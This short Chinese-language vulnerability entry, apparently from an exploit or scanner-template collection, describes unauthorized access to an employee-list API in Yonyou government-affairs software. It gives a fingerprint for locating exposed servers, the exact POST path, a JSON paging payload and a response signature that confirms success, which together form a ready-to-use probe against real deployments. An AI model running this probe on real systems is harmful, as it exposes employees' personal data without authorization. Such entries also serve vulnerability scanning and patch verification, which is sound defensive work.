# 用友政务系统seletMaEmpListForPrsCalc存在未授权访问漏洞

用友 ｜ 未授权访问 ｜ —
- **指纹**：`body="/pf/portal/login/css/fonts/style.css"`
- **请求**：`POST /ma/emp/api/seletMaEmpListForPrsCalc HTTP/1.1`

**Payload**
```
{"pageNum":1,"pageSize":1}
```
- **响应特征**：200 rmwyid